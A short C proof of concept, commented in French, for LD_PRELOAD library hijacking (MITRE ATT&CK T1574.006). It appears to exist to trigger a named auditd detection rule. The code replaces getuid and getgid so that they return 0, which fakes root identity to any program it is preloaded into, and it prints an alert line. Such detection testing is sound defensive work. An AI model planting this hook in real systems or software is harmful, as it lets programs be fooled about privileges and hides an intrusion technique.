/*
 * =====================================================================
 * PoC 4 — LD_PRELOAD Library Hijacking
 * MITRE ATT&CK : T1574.006
 * Détection attendue : Règle 100006 (Niveau 10 via Auditd / execve)
 * =====================================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

uid_t getuid(void) {
    fprintf(stderr, "\n[!] ALERT: Hijacking via LD_PRELOAD effectué !\n");
    return 0;
}

gid_t getgid(void) {
    return 0;
}